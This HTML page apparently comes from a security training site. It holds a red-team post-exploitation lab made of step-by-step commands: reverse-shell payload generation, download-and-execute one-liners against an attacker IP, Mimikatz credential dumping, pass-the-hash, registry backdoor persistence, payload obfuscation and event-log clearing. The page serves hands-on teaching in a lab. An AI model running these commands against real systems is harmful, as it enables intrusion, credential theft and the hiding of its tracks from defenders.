<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Project 12 Lab: Red Team Operations &amp; Post-Exploitation | Proftsec</title>
<meta name="keywords" content="Red Team, Post-Exploitation, C2 Frameworks, Privilege Escalation">
<meta name="description" content="Hands-on lab for mastering red team post-exploitation techniques and command-and-control frameworks.">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/projects/advanced-securitypenetration-testing/red-team-operationspost-exploitation/lab/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.9de45e225101e4f99701d2b68fc6b8a1ef6027928be6391fa15bf7f56326c909.css" integrity="sha256-neReIlEB5PmXAdK2j8a4oe9gJ5KL5jkfoVv39WMmyQk=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">


<script>
    fetch('/.netlify/functions/get-ga-id')
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.text();
        })
        .then(id => {
            if (!id || id === "No GA ID found") {
                console.warn("GA4 ID not found. Ensure your Netlify environment variable is set.");
                return;
            }

            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', id);
        })
        .catch(error => console.error("Error loading GA4 ID:", error));
</script>

<link rel="alternate" hreflang="en" href="http://localhost:1313/projects/advanced-securitypenetration-testing/red-team-operationspost-exploitation/lab/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }
</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Proftsec (Alt + H)">
                    <img src="http://localhost:1313/images/logo.webp" alt="" aria-label="logo"
                        height="40">Proftsec</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/about/">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/projects/">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/blog/">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/podcasts/">
                    <span>Podcasts</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Project 12 Lab: Red Team Operations &amp; Post-Exploitation
    </h1>
    <div class="post-description">
      Hands-on lab for mastering red team post-exploitation techniques and command-and-control frameworks.
    </div>
    <div class="post-meta"><span title='2025-03-08 00:00:00 +0000 UTC'>March 8, 2025</span>

</div>
  </header> 
  <div class="post-content"><h1 id="red-team-operations--post-exploitation-lab">Red Team Operations &amp; Post-Exploitation Lab<a hidden class="anchor" aria-hidden="true" href="#red-team-operations--post-exploitation-lab">#</a></h1>
<h2 id="overview"><strong>Overview</strong><a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
<p>This lab focuses on post-exploitation tactics used in red team engagements. After initial access, adversaries work to establish persistence, escalate privileges, move laterally, and execute objectives while evading detection. This lab provides practical exercises using real-world tools and techniques.</p>
<h2 id="what-you-will-learn"><strong>What You Will Learn</strong><a hidden class="anchor" aria-hidden="true" href="#what-you-will-learn">#</a></h2>
<ul>
<li><strong>Establishing persistence</strong> with registry modifications and scheduled tasks</li>
<li><strong>Privilege escalation</strong> on Windows and Linux</li>
<li><strong>Lateral movement</strong> using Pass-the-Hash, Kerberoasting, and RDP hijacking</li>
<li><strong>Using C2 frameworks</strong> like Cobalt Strike, Sliver, or Empire</li>
<li><strong>Evading detection</strong> with obfuscation, anti-forensics, and log manipulation</li>
</ul>
<hr>
<h2 id="lab-instructions"><strong>Lab Instructions</strong><a hidden class="anchor" aria-hidden="true" href="#lab-instructions">#</a></h2>
<h3 id="1-setting-up-your-environment"><strong>1. Setting Up Your Environment</strong><a hidden class="anchor" aria-hidden="true" href="#1-setting-up-your-environment">#</a></h3>
<p>You will need:</p>
<ul>
<li>A <strong>Kali Linux machine</strong> (attacker)</li>
<li>A <strong>Windows Server or Client VM</strong> (target)</li>
<li>A <strong>Linux-based victim machine</strong> (optional, for cross-platform techniques)</li>
<li>Tools: <strong>Cobalt Strike/Sliver/Empire</strong>, Mimikatz, CrackMapExec, BloodHound</li>
</ul>
<h4 id="step-1-install-required-tools"><strong>Step 1: Install Required Tools</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-install-required-tools">#</a></h4>
<p>On Kali Linux, install:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> sudo apt install mimikatz crackmapexec bloodhound
</span></span></code></pre></div><p>For C2 frameworks, download and configure:</p>
<ul>
<li><strong>Sliver</strong>: <code>curl https://sliver.sh/install | bash</code></li>
<li><strong>Empire</strong>: <code>git clone https://github.com/BC-SECURITY/Empire.git</code></li>
</ul>
<hr>
<h3 id="2-gaining-initial-access"><strong>2. Gaining Initial Access</strong><a hidden class="anchor" aria-hidden="true" href="#2-gaining-initial-access">#</a></h3>
<p>Use a reverse shell to establish a foothold on the target.</p>
<h4 id="step-1-generate-a-payload"><strong>Step 1: Generate a payload</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-generate-a-payload">#</a></h4>
<p>Using Sliver:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sliver-server generate --mtls 192.168.1.100 --save /tmp/revshell.exe
</span></span></code></pre></div><p>Or using Metasploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_https LHOST<span style="color:#f92672">=</span>192.168.1.100 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f exe &gt; revshell.exe
</span></span></code></pre></div><h4 id="step-2-transfer--execute-payload"><strong>Step 2: Transfer &amp; Execute Payload</strong><a hidden class="anchor" aria-hidden="true" href="#step-2-transfer--execute-payload">#</a></h4>
<p>Move the payload to the target:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://192.168.1.100/revshell.exe&#34;</span> -OutFile <span style="color:#e6db74">&#34;C:\Users\Public\revshell.exe&#34;</span>
</span></span><span style="display:flex;"><span>Start-Process <span style="color:#e6db74">&#34;C:\Users\Public\revshell.exe&#34;</span>
</span></span></code></pre></div><hr>
<h3 id="3-privilege-escalation"><strong>3. Privilege Escalation</strong><a hidden class="anchor" aria-hidden="true" href="#3-privilege-escalation">#</a></h3>
<p>Identify potential privilege escalation vectors.</p>
<h4 id="step-1-check-user-privileges"><strong>Step 1: Check User Privileges</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-check-user-privileges">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>whoami /priv
</span></span></code></pre></div><h4 id="step-2-exploit-misconfigurations"><strong>Step 2: Exploit Misconfigurations</strong><a hidden class="anchor" aria-hidden="true" href="#step-2-exploit-misconfigurations">#</a></h4>
<p>Using <strong>WinPEAS</strong> to enumerate privileges:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -ep bypass -c <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.100/winpeas.ps1&#39;)&#34;</span>
</span></span></code></pre></div><p>Use <strong>Mimikatz</strong> to extract credentials:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz
</span></span><span style="display:flex;"><span>sekurlsa::logonpasswords
</span></span></code></pre></div><hr>
<h3 id="4-lateral-movement"><strong>4. Lateral Movement</strong><a hidden class="anchor" aria-hidden="true" href="#4-lateral-movement">#</a></h3>
<p>Move across the network undetected.</p>
<h4 id="step-1-scan-for-available-targets"><strong>Step 1: Scan for Available Targets</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-scan-for-available-targets">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.0/24 -u Administrator -p <span style="color:#e6db74">&#39;password123&#39;</span>
</span></span></code></pre></div><h4 id="step-2-pass-the-hash-attack"><strong>Step 2: Pass-the-Hash Attack</strong><a hidden class="anchor" aria-hidden="true" href="#step-2-pass-the-hash-attack">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.102 -u <span style="color:#e6db74">&#39;Admin&#39;</span> -H <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0&#39;</span>
</span></span></code></pre></div><hr>
<h3 id="5-persistence--evasion"><strong>5. Persistence &amp; Evasion</strong><a hidden class="anchor" aria-hidden="true" href="#5-persistence--evasion">#</a></h3>
<p>Ensure long-term access while avoiding detection.</p>
<h4 id="step-1-registry-persistence"><strong>Step 1: Registry Persistence</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-registry-persistence">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d <span style="color:#e6db74">&#34;C:\Users\Public\revshell.exe&#34;</span>
</span></span></code></pre></div><h4 id="step-2-obfuscate-payloads"><strong>Step 2: Obfuscate Payloads</strong><a hidden class="anchor" aria-hidden="true" href="#step-2-obfuscate-payloads">#</a></h4>
<p>Use <strong>Veil</strong> to generate undetectable payloads:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>veil -t python/shellcode_inject
</span></span></code></pre></div><h4 id="step-3-clear-event-logs"><strong>Step 3: Clear Event Logs</strong><a hidden class="anchor" aria-hidden="true" href="#step-3-clear-event-logs">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wevtutil cl Security
</span></span></code></pre></div><hr>
<h2 id="final-submission"><strong>Final Submission</strong><a hidden class="anchor" aria-hidden="true" href="#final-submission">#</a></h2>
<ul>
<li>Submit a <strong>Google Doc</strong> with screenshots of each completed task.</li>
<li>Write a short summary on what each technique accomplished.</li>
<li>Follow submission guidelines as provided by your instructor.</li>
</ul>
<p>ðŸš€ <strong>Congratulations! You&rsquo;ve completed Red Team Operations &amp; Post-Exploitation!</strong> ðŸš€</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/red-team/">Red Team</a></li>
      <li><a href="http://localhost:1313/tags/post-exploitation/">Post-Exploitation</a></li>
      <li><a href="http://localhost:1313/tags/c2-frameworks/">C2 Frameworks</a></li>
      <li><a href="http://localhost:1313/tags/privilege-escalation/">Privilege Escalation</a></li>
    </ul>
  </footer>
</article>
    </main>

    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Proftsec</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>

</body>

</html>
